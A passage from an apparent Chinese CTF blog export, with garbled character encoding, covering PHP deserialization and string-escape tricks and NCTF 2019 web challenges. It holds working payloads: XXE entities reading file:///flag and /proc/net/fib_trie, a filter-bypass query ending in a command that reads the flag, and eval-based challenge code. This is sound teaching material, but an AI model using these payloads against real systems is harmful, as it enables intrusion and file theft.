stripos($this-&gt;file,&apos;..&apos;)===FALSE  \n        &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\\\&apos;)==FALSE) {\n            return @file_get_contents($this-&gt;file);\n        }\n    }\n}\n?&gt;</code></pre><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°index.phpä¸­å…ˆåŒ…å«äº†shield.phpï¼Œç„¶ååˆ›å»ºäº†ä¸€ä¸ªæ–°å¯¹è±¡ï¼Œåœ¨åˆ¤æ–­å®Œgetçš„å˜é‡ä¹‹åè¿›è¡Œååºåˆ—åŒ–ï¼Œéšåè°ƒç”¨readfile()å‡½æ•°ã€‚<br>åœ¨shield.phpä¸­æç¤ºflagåœ¨pctf.phpä¸­ï¼Œéšååœ¨readfile()å‡½æ•°ä¸­å¯¹$fileè¿›è¡Œä¸€å®šè¿‡æ»¤ä¹‹åè¯»æ–‡ä»¶å†…å®¹ã€‚</p>\n<p>æˆ‘ä»¬çš„æƒ³æ³•å°±æ˜¯æ§åˆ¶$fileçš„å€¼ä¸ºpctf.php</p>\n<pre><code>&lt;?php\n//flag is in pctf.php\nclass Shield {\n    public $file;\n    function __construct($filename = &apos;&apos;) {\n        $this -&gt; file = $filename;\n    }\n    function readfile() {\n        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  \n        &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\\\&apos;)==FALSE) {\n            return @file_get_contents($this-&gt;file);\n        }\n    }\n}\n$a = new Shield(&quot;pctf.php&quot;);\necho serialize($a);\n?&gt;\nåºåˆ—åŒ–ç»“æœ\nO:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥å°è¯•ä¼ å…¥è¿™ä¸ªå­—ç¬¦ä¸²</p>\n<pre><code>class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>å°±å¯ä»¥åœ¨æºç ä¸­çœ‹åˆ°flag.</p>\n<p><img src=\"https://i.imgur.com/rAYet4u.png\" alt></p>\n<h2 id=\"ROP-Return-Oriented-programming-é“¾\"><a href=\"#ROP-Return-Oriented-programming-é“¾\" class=\"headerlink\" title=\"ROP(Return-Oriented programming)é“¾\"></a>ROP(Return-Oriented programming)é“¾</h2><p>è¿™é“é¢˜çš„æ”»å‡»é“¾æ¯”è¾ƒç®€å•ã€‚å½“æˆ‘ä»¬ä¼ å…¥åºåˆ—åŒ–å®Œæˆçš„å­—ç¬¦ä¸²åï¼Œç¨‹åºå…ˆå¯¹å…¶ååºåˆ—åŒ–ç”Ÿæˆä¸€ä¸ªå¯¹è±¡ï¼Œè¿™æ—¶æ²¡æœ‰_wakeup()ï¼Œ_destruct()é­”æ³•å‡½æ•°ï¼Œåªæ˜¯ç®€å•çš„ååºåˆ—åŒ–ï¼Œä¹‹åè°ƒç”¨readfile()å‡½æ•°è¿›è¡Œ$fileçš„å†…å®¹çš„è¯»å–ï¼Œè€Œæˆ‘ä»¬å°†$fileçš„å€¼è®¾ç½®ä¸ºäº†pctf.phpï¼Œäºæ˜¯æˆ‘ä»¬å¾—åˆ°äº†è¯¥æ–‡ä»¶çš„å†…å®¹ã€‚<br>ååºåˆ—åŒ–æ¼æ´éœ€è¦ä¸¤ä¸ªæ¡ä»¶ï¼š</p>\n<blockquote>\n<p>1.å­˜åœ¨åºåˆ—åŒ–å­—ç¬¦ä¸²çš„å¯æ§åˆ¶ç‚¹æˆ–è€…è¯´æ˜¯è¾“å…¥ç‚¹</p>\n<p>2.å­˜åœ¨å¯ä»¥åˆ©ç”¨çš„é­”æ³•å‡½æ•°</p>\n</blockquote>\n<h2 id=\"ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸\"><a href=\"#ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸\" class=\"headerlink\" title=\"ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸\"></a>ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</h2><p>å½“æˆ‘ä»¬åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­é‡åˆ°è¿‡æ»¤å‡½æ•°ï¼Œè¿™ç§è¿‡æ»¤å¯èƒ½æ˜¯</p>\n<ul>\n<li>è¿‡æ»¤åé•¿åº¦å¢åŠ </li>\n<li>è¿‡æ»¤åé•¿åº¦å‡å°‘</li>\n</ul>\n<p>å½“è¦ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²é•¿åº¦å‘ç”Ÿå˜åŒ–æ—¶ï¼Œå°±å¯èƒ½ä¼šå‡ºç°å­—ç¬¦ä¸²é€ƒé€¸çš„é—®é¢˜ã€‚</p>\n<p>æ¯”å¦‚æˆ‘ç°åœ¨æœ‰å¦‚ä¸‹ä»£ç ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">$username = <span class=\"string\">'luc1fer3'</span>;</span><br><span class=\"line\">$pwd = <span class=\"string\">'admin'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">replace</span><span class=\"params\">($string)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> str_replace(<span class=\"string\">'3'</span>,<span class=\"string\">'22'</span>,$string);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$ser = <span class=\"keyword\">array</span>($username,$pwd);</span><br><span class=\"line\">var_dump(serialize($ser)).<span class=\"string\">\"\\r\\n\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$b = replace(serialize($ser));</span><br><span class=\"line\">var_dump($b).<span class=\"string\">\"\\r\\n\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>æ‰§è¡Œç»“æœï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">string(<span class=\"number\">41</span>) <span class=\"string\">\"a:2:&#123;i:0;s:8:\"</span>luc1fer3<span class=\"string\">\";i:1;s:5:\"</span>admin<span class=\"string\">\";&#125;\"</span></span><br><span class=\"line\">string(<span class=\"number\">42</span>) <span class=\"string\">\"a:2:&#123;i:0;s:8:\"</span>luc1fer22<span class=\"string\">\";i:1;s:5:\"</span>admin<span class=\"string\">\";&#125;\"</span> <span class=\"comment\">//å±æ€§é•¿åº¦ä»ç„¶æ˜¯ 8</span></span><br></pre></td></tr></table></figure>\n\n<p>è¿™æ˜¯é•¿åº¦å¢åŠ çš„æƒ…å†µã€‚ç°åœ¨è€ƒè™‘ä¸€ç§æƒ…å†µï¼šæˆ‘ä»¬è¦æ±‚æ›´æ”¹å¯†ç ä¸º <code>admin888</code> ï¼Œè¯¥æ€ä¹ˆåšï¼Ÿ</p>\n<p>é¦–å…ˆæˆ‘ä»¬çŸ¥é“å¦‚æœå­—ç¬¦ä¸²çš„é•¿åº¦ä¸åºåˆ—åŒ–åçš„å±æ€§é•¿åº¦ä¸åŒï¼Œååºåˆ—åŒ–æ˜¯ä¼šæŠ¥é”™çš„</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$e = <span class=\"string\">'a:2:&#123;i:0;s:8:\"luc1fer3\";i:1;s:4:\"admin\";&#125;'</span>; <span class=\"comment\">//ä¿®æ”¹é•¿åº¦ä¸º4</span></span><br><span class=\"line\">var_dump(unserialize($e));</span><br><span class=\"line\"></span><br><span class=\"line\">PHP Notice:  unserialize(): Error at offset <span class=\"number\">37</span> of <span class=\"number\">41</span> bytes</span><br><span class=\"line\">    bool(<span class=\"keyword\">false</span>)</span><br></pre></td></tr></table></figure>\n\n<p>å¹¶ä¸”ï¼Œphp åœ¨ååºåˆ—åŒ–æ—¶ä¼šæŠŠä¸€äº›å­—ç¬¦å½“ä½œåˆ†éš”ç¬¦ <code>}</code> </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$e = <span class=\"string\">'a:2:&#123;i:0;s:8:\"luc1fer3\";i:1;s:5:\"admin\";&#125;;i:2;s:2:\"ab\";&#125;'</span>; <span class=\"comment\">//è¯†åˆ«åˆ°ç¬¬ä¸€ä¸ª &#125; ä¹‹åå°±è®¤ä¸ºç›®æ ‡å­—ç¬¦ä¸²ç»“æŸï¼Œåé¢çš„ä¼šå¿½ç•¥æ‰ã€‚</span></span><br><span class=\"line\">var_dump(unserialize($e));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">array</span>(<span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">  [<span class=\"number\">0</span>]=&gt;</span><br><span class=\"line\">  string(<span class=\"number\">8</span>) <span class=\"string\">\"luc1fer3\"</span></span><br><span class=\"line\">  [<span class=\"number\">1</span>]=&gt;</span><br><span class=\"line\">  string(<span class=\"number\">5</span>) <span class=\"string\">\"admin\"</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>äºæ˜¯æˆ‘ä»¬å¯ä»¥æƒ³åˆ°ï¼Œå¦‚æœæˆ‘ä»¬è‡ªå·±æ„é€ ä¸€ä¸ªç‰¹æ®Šçš„å­—ç¬¦ä¸²ï¼Œæ‰‹åŠ¨é—­åˆ <code>}</code> , é‚£æˆ‘ä»¬å°±å¯ä»¥å¼ºè¡Œåœ¨ååºåˆ—åŒ–ä¹‹åå¡å…¥ä¸€ä¸ªæˆ‘ä»¬è‡ªå·±çš„å±æ€§ã€‚</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$new_pwd = <span class=\"string\">'\";i:1;s:8:\"admin888\";&#125;'</span>; <span class=\"comment\">//length = 22 ç¬¬ä¸€ä¸ªåŒå¼•å·ç”¨æ¥é—­åˆ username</span></span><br></pre></td></tr></table></figure>\n\n<p>è€ƒè™‘åˆ°å‰é¢çš„è¿‡æ»¤å‡½æ•°ï¼Œæˆ‘ä»¬çš„è®¡åˆ’æ˜¯è®¾æ³•ä½¿è¿‡æ»¤åçš„é•¿åº¦å¢åŠ ï¼ˆå› ä¸ºç³»åˆ—åŒ–åçš„å­—ç¬¦ä¸²é•¿åº¦å¢åŠ äº†ï¼Œä½†æ˜¯å±æ€§çš„é•¿åº¦å¹¶ä¸å˜ï¼‰ï¼Œè®©åç³»åˆ—åŒ–æ—¶ç³»ç»Ÿè¯»å–çš„æ˜¯è¿‡æ»¤åå¢åŠ çš„æ•°æ®ï¼Œç„¶åæŠŠæ„é€ çš„æ•°æ®å˜æˆæ–°çš„å±æ€§ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'a:2:&#123;i:0;s:51:\"luc1fer3333333333333333333333\";i:1;s:8:\"admin888\";&#125;\";i:1;s:5:\"admin\";&#125;'</span> </span><br><span class=\"line\">    <span class=\"comment\">//æ³¨æ„è¿™é‡Œæˆ‘ä»¬æ ¹æ®æ„é€ çš„å­—ç¬¦ä¸²é•¿åº¦å¢åŠ äº†21ä¸ª3ï¼Œå¯ä»¥çœ‹åˆ°</span></span><br><span class=\"line\">    luc1fer3333333333333333333333<span class=\"string\">\";i:1;s:8:\"</span>admin888<span class=\"string\">\";&#125; </span></span><br><span class=\"line\"><span class=\"string\">    çš„é•¿åº¦æ˜¯ 8+21+22=73</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">'a:2:&#123;i:0;s:51:\"</span>luc1fer22222222222222222222222222222222222222222222<span class=\"string\">\";i:1;s:8:\"</span>admin888<span class=\"string\">\";&#125;\"</span>;i:<span class=\"number\">1</span>;s:<span class=\"number\">5</span>:<span class=\"string\">\"admin\"</span>;&#125;<span class=\"string\">' </span></span><br><span class=\"line\"><span class=\"string\">\t//è¿‡æ»¤å51æ²¡å˜ï¼Œä½†æ˜¯</span></span><br><span class=\"line\"><span class=\"string\">luc1fer22222222222222222222222222222222222222222222\";i:1;s:8:\"admin888\";&#125;å®é™…é•¿åº¦å´å˜æˆäº† 8+21+22+22</span></span><br></pre></td></tr></table></figure>\n\n<p>æ¯å‡ºç°ä¸€ä¸ª 3 å°±æ›¿æ¢æˆ 22 ,é•¿åº¦åŠ  1 ã€‚ æˆ‘ä»¬æ„é€ çš„å­—ç¬¦ä¸²é•¿åº¦æ˜¯ 22 ï¼Œæˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨ 22 ä¸ª(æœ¬æ¥å¸¦çš„æœ‰ä¸€ä¸ªï¼Œæ‰€ä»¥æ·»åŠ 21ä¸ªå°±å¯ä»¥) 3 æ¥ä½¿é•¿åº¦å¢åŠ 22ã€‚</p>\n<p>ä»ä¸Šé¢çš„ä¾‹å­å¯ä»¥çœ‹å‡ºï¼Œè¿‡æ»¤åçš„å±æ€§é•¿åº¦51ï¼Œåœ¨åç³»åˆ—åŒ–çš„æ—¶å€™åˆšå¥½æŠŠæ›¿æ¢åçš„æ•°æ®è¯»å®Œï¼Œæˆ‘ä»¬æ„é€ çš„æ•°æ®é—­åˆäº†åŒå¼•å·å°±é€ƒé€¸å‡ºæ¥å˜æˆæ–°å±æ€§äº†ã€‚åé¢åŸæ¥çš„å±æ€§ä¼šè¢«å¿½ç•¥ã€‚</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$username = <span class=\"string\">'luc1fer3333333333333333333333\";i:1;s:8:\"admin888\";&#125;'</span>;</span><br><span class=\"line\">$pwd = <span class=\"string\">'admin'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">replace</span><span class=\"params\">($string)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> str_replace(<span class=\"string\">'3'</span>,<span class=\"string\">'22'</span>,$string);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$a = replace(serialize($ser));</span><br><span class=\"line\">var_dump($a).<span class=\"string\">\"\\r\\n\"</span>;</span><br><span class=\"line\">var_dump(unserialize($a));</span><br><span class=\"line\"></span><br><span class=\"line\">string(<span class=\"number\">107</span>) <span class=\"string\">\"a:2:&#123;i:0;s:51:\"</span>luc1fer22222222222222222222222222222222222222222222<span class=\"string\">\";i:1;s:8:\"</span>admin888<span class=\"string\">\";&#125;\"</span>;i:<span class=\"number\">1</span>;s:<span class=\"number\">5</span>:<span class=\"string\">\"admin\"</span>;&#125;<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">array(2) &#123;</span></span><br><span class=\"line\"><span class=\"string\">  [0]=&gt;</span></span><br><span class=\"line\"><span class=\"string\">  string(51) \"</span>luc1fer22222222222222222222222222222222222222222222<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">  [1]=&gt;</span></span><br><span class=\"line\"><span class=\"string\">  string(8) \"</span>admin888<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br></pre></td></tr></table></figure>\n\n","text":"åºåˆ—åŒ–ä¸ååºåˆ—åŒ–0x01ä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–phpå…è®¸ä¿å­˜ä¸€ä¸ªå¯¹è±¡æ–¹ä¾¿ä»¥åé‡ç”¨ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºåºåˆ—åŒ–ã€‚åœ¨ä¼ é€’å˜é‡çš„è¿‡ç¨‹ä¸­æœ‰å¯èƒ½é‡åˆ°å˜é‡å€¼è·¨è„šæœ¬ä¼ è¾“çš„è¿‡ç¨‹ã€‚æ¯”å¦‚æ–‡ä»¶ç»“æ„æ˜¯è¿™æ ·çš„ï¼š [Figure] ","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"serialize","slug":"serialize","count":4,"path":"api/tags/serialize.json"}]},{"title":"NCTF","slug":"NCTF","date":"2019-11-26T12:45:31.000Z","updated":"2020-04-29T05:45:19.118Z","comments":true,"path":"api/articles/NCTF.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"NCTF\"><a href=\"#NCTF\" class=\"headerlink\" title=\"NCTF\"></a>NCTF</h1><p>11/26/2019 8:45:31 PM </p>\n<h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><h3 id=\"Fake-XML-cookbook\"><a href=\"#Fake-XML-cookbook\" class=\"headerlink\" title=\"Fake XML cookbook\"></a>Fake XML cookbook</h3><p>ç®€å•çš„xxe</p>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; \n&lt;!DOCTYPE creds [  \n&lt;!ENTITY goodies SYSTEM &quot;file:///flag&quot;&gt; ]&gt; \n\n&lt;user&gt;&lt;username&gt;&amp;goodies;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;</code></pre><h3 id=\"ture-XML-cookbook\"><a href=\"#ture-XML-cookbook\" class=\"headerlink\" title=\"ture XML cookbook\"></a>ture XML cookbook</h3><p>å¸¸ç”¨çš„å†…ç½‘IPæ–‡ä»¶<code>/etc/hosts</code> ã€ <code>/proc/net/arp</code> ã€ <code>/proc/net/fib_trie</code></p>\n<p><strong>requests</strong></p>\n<pre><code>&lt;!DOCTYPE ANY [\n\n&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/proc/net/fib_trie&quot;&gt;\n\n]&gt;\n\n\n&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;adssa&lt;/password&gt;&lt;/user&gt;</code></pre><p><strong>response</strong></p>\n<pre><code>X-Powered-By: PHP/7.4.0RC6\n\n\n&lt;result&gt;&lt;code&gt;0&lt;/code&gt;&lt;msg&gt;TWFpbjoKICArLS0gMC4wLjAuMC8wIDIgMCAyCiAgICAgKy0tIDEyNy4wLjAuMC84IDIgMCAyCiAgICAgICAgKy0tIDEyNy4wLjAuMC8zMSAxIDAgMAogICAgICAgICAgIHwtLSAxMjcuMC4wLjAKICAgICAgICAgICAgICAvMzIgbGluayBCUk9BRENBU1QKICAgICAgICAgICAgICAvOCBob3N0IExPQ0FMCiAgICAgICAgICAgfC0tIDEyNy4wLjAuMQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDEyNy4yNTUuMjU1LjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICstLSAxNzMuMjI1LjE1MC4wLzI0IDIgMCAyCiAgICAgICAgKy0tIDE3My4yMjUuMTUwLjAvMjggMiAwIDIKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuMAogICAgICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICAgICAgICAgIC8yNCBsaW5rIFVOSUNBU1QKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuOQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDE3My4yMjUuMTUwLjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVApMb2NhbDoKICArLS0gMC4wLjAuMC8wIDIgMCAyCiAgICAgKy0tIDEyNy4wLjAuMC84IDIgMCAyCiAgICAgICAgKy0tIDEyNy4wLjAuMC8zMSAxIDAgMAogICAgICAgICAgIHwtLSAxMjcuMC4wLjAKICAgICAgICAgICAgICAvMzIgbGluayBCUk9BRENBU1QKICAgICAgICAgICAgICAvOCBob3N0IExPQ0FMCiAgICAgICAgICAgfC0tIDEyNy4wLjAuMQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDEyNy4yNTUuMjU1LjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICstLSAxNzMuMjI1LjE1MC4wLzI0IDIgMCAyCiAgICAgICAgKy0tIDE3My4yMjUuMTUwLjAvMjggMiAwIDIKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuMAogICAgICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICAgICAgICAgIC8yNCBsaW5rIFVOSUNBU1QKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuOQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDE3My4yMjUuMTUwLjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAo=&lt;/msg&gt;&lt;/result&gt;</code></pre><p>è§£å¯†ï¼š</p>\n<pre><code>Main:\n  +-- 0.0.0.0/0 2 0 2\n +-- 127.0.0.0/8 2 0 2\n+-- 127.0.0.0/31 1 0 0\n   |-- 127.0.0.0\n  /32 link BROADCAST\n  /8 host LOCAL\n   |-- 127.0.0.1\n  /32 host LOCAL\n|-- 127.255.255.255\n   /32 link BROADCAST\n +-- 173.225.150.0/24 2 0 2\n+-- 173.225.150.0/28 2 0 2\n   |-- 173.225.150.0\n  /32 link BROADCAST\n  /24 link UNICAST\n   |-- 173.225.150.9\n  /32 host LOCAL\n|-- 173.225.150.255\n   /32 link BROADCAST\nLocal:\n  +-- 0.0.0.0/0 2 0 2\n +-- 127.0.0.0/8 2 0 2\n+-- 127.0.0.0/31 1 0 0\n   |-- 127.0.0.0\n  /32 link BROADCAST\n  /8 host LOCAL\n   |-- 127.0.0.1\n  /32 host LOCAL\n|-- 127.255.255.255\n   /32 link BROADCAST\n +-- 173.225.150.0/24 2 0 2\n+-- 173.225.150.0/28 2 0 2\n   |-- 173.225.150.0\n  /32 link BROADCAST\n  /24 link UNICAST\n   |-- 173.225.150.9\n  /32 host LOCAL\n|-- 173.225.150.255\n   /32 link BROADCAST</code></pre><p>ç…§ç€Ipè®¿é—®ï¼Œåæ§½æˆ‘çš„windowsä¸‹burpå“åº”å…¨æ˜¯ä¹±ç ï¼Œæäº†åŠå¤©å»kaliå°±æ²¡äº‹äº†ã€‚</p>\n<h3 id=\"ezphp\"><a href=\"#ezphp\" class=\"headerlink\" title=\"ezphp\"></a>ezphp</h3><pre><code>&lt;?php\nerror_reporting(0);\nhighlight_file(__file__);\n$string_1 = $_GET[&apos;str1&apos;];\n$string_2 = $_GET[&apos;str2&apos;];\n$cmd = $_GET[&apos;q_w_q&apos;];\n\n\n//1st\nif($_GET[&apos;num&apos;] !== &apos;23333&apos; &amp;&amp; preg_match(&apos;/^23333$/&apos;, $_GET[&apos;num&apos;])){\n    echo &apos;1st ok&apos;.&quot;&lt;br&gt;&quot;;\n}\nelse{\n    die(&apos;23333333&apos;);\n}\n\n\n//2nd\nif(is_numeric($string_1)){\n    $md5_1 = md5($string_1);\n    $md5_2 = md5($string_2);\n    if($md5_1 != $md5_2){\n        $a = strtr($md5_1, &apos;cxhp&apos;, &apos;0123&apos;);    //strstr â€” æŸ¥æ‰¾å­—ç¬¦ä¸²çš„é¦–æ¬¡å‡ºç°ï¼Œ\n        $b = strtr($md5_2, &apos;cxhp&apos;, &apos;0123&apos;);\n        if($a == $b){\n            echo &apos;2nd ok&apos;.&quot;&lt;br&gt;&quot;;\n        }\n        else{\n            die(&quot;can u give me the right str???&quot;);\n        }\n    } \n    else{\n        die(&quot;no!!!!!!!!&quot;);\n    }\n}\nelse{\n    die(&apos;is str1 numeric??????&apos;);\n}\n\n\n//3rd\n$query = $_SERVER[&apos;QUERY_STRING&apos;];\nif (strlen($cmd) &gt; 8){\n    die(&quot;too long :(&quot;);\n}\n\nif( substr_count($query, &apos;_&apos;) === 0 &amp;&amp; substr_count($query, &apos;%5f&apos;) === 0 ){\n    $arr = explode(&apos; &apos;, $cmd);          //explode â€” ä½¿ç”¨ä¸€ä¸ªå­—ç¬¦ä¸²åˆ†å‰²å¦ä¸€ä¸ªå­—ç¬¦ä¸²\n    if($arr[0] !== &apos;ls&apos; || $arr[0] !== &apos;pwd&apos;){\n        if(substr_count($cmd, &apos;cat&apos;) === 0){\n            system($cmd);\n        }\n        else{\n            die(&apos;ban cat :) &apos;);\n        }\n    }\n    else{\n        die(&apos;bad guy!&apos;);\n    }\n}\nelse{\n    die(&apos;nonono _ is bad&apos;);\n}\n?&gt; </code></pre><p>ç¬¬ä¸€å±‚ä½¿ç”¨ %0a æˆªæ–­ç»•è¿‡ï¼Œç¬¬äºŒå±‚md5ç»•è¿‡<a href=\"https://brainlyh.github.io/2019/08/19/Black-magic/#md5%E6%AF%94%E8%BE%83\" target=\"_blank\" rel=\"noopener\">https://brainlyh.github.io/2019/08/19/Black-magic/#md5%E6%AF%94%E8%BE%83</a> å‰é¢å‡ æ¡0eå¼€å¤´çš„å­—ç¬¦ä¸²å»è§£å¯†å‘ç°éƒ½æ”¶è´¹ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨ <code>s878926199a</code> ,åŠ å¯†å®Œè§£å¯†å¾— <code>2120624</code> ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æ•°å­—ç»•è¿‡ç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼Œç¬¬ä¸‰å±‚ ä½¿ç”¨ <code>.</code> ç»•è¿‡ <code>_</code> ï¼Œ<code>%20</code> æ›¿ä»£ç©ºæ ¼ï¼Œä½¿ç”¨<code>l${x}s</code> åˆ—ç›®å½•ï¼Œ<code>tac%20f*</code> è¯» <code>flag</code> .</p>\n<p>çœ‹ä¸€ä¸ª <code>strstr()</code> çš„ä¾‹å­</p>\n<pre><code>$email  = &apos;name@example.com&apos;;\n$domain = strstr($email, &apos;@&apos;);\necho $domain.&quot;\\r\\n&quot;; // æ‰“å° @example.com\n\n$user = strstr($email, &apos;@&apos;, true); // ä» PHP 5.3.0 èµ·\necho $user.&quot;\\r\\n&quot;; // æ‰“å° name\nvar_dump(&quot;01&quot;==true);\n\nè¾“å‡ºï¼š\n@example.com\nname\nbool(true)</code></pre><p>payload:</p>\n<pre><code>?num=23333%0a\n&amp;str1=2120624\n&amp;str2=s214587387a\n&amp;q.w.q=tac%20f*</code></pre><h3 id=\"hacker-backdoor\"><a href=\"#hacker-backdoor\" class=\"headerlink\" title=\"hacker backdoor\"></a>hacker backdoor</h3><pre><code> &lt;?php\nerror_reporting(0);\nif(!isset($_GET[&apos;code&apos;]) || !isset($_GET[&apos;useful&apos;])){\n    highlight_file(__file__);\n}\n$code = $_GET[&apos;code&apos;];\n$usrful = $_GET[&apos;useful&apos;];\n\nfunction waf($a){\n    $dangerous = get_defined_functions();    //get_defined_functions â€” è¿”å›æ‰€æœ‰å·²å®šä¹‰å‡½æ•°çš„æ•°ç»„\n    array_push($dangerous[&quot;internal&quot;], &apos;eval&apos;, &apos;assert&apos;);  //å‹å…¥æ ˆåº•\n    foreach ($dangerous[&quot;internal&quot;] as $bad) {\n        if(strpos($a,$bad) !== FALSE){\n        return False;\n        break;\n        }\n    }\n    return True;\n}\n\nif(file_exists($usrful)){\n    if(waf($code)){\n        eval($code);\n    }\n    else{\n        die(&quot;oh,ä¸èƒ½è¾“å…¥è¿™äº›å‡½æ•°å“¦ :) &quot;);\n    }\n}</code></pre><p>æµ‹è¯•ä¸€ä¸‹$dangerous</p>\n<pre><code>&lt;?php  \n$dangerous = get_defined_functions();\narray_push($dangerous[&quot;internal&quot;], &apos;eval&apos;, &apos;assert&apos;);\nforeach ($dangerous[&quot;internal&quot;] as $bad) { \n    if(strpos(&quot;phpinfo&quot;,$bad)!== FALSE){\n        echo &quot;badbad&quot;.&quot;\\r\\n&quot;;\n    